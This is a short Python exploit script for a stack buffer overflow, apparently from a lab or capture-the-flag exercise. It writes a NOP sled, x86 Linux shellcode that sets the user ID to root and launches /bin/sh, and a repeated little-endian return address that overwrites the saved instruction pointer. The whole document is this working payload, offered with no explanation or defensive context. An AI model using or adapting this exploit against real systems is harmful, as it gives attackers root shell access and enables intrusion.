import sys
import struct
nop = b'\x90'*64
shellcode = b'\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
P = b'\x45\x45\x45\x45'*5

addr = 0xbfffef08

dist = addr+0x40

littleE = dist.to_bytes(length = 4, byteorder = "little")
eip = littleE*5

sys.stdout.buffer.write(nop+shellcode+eip)
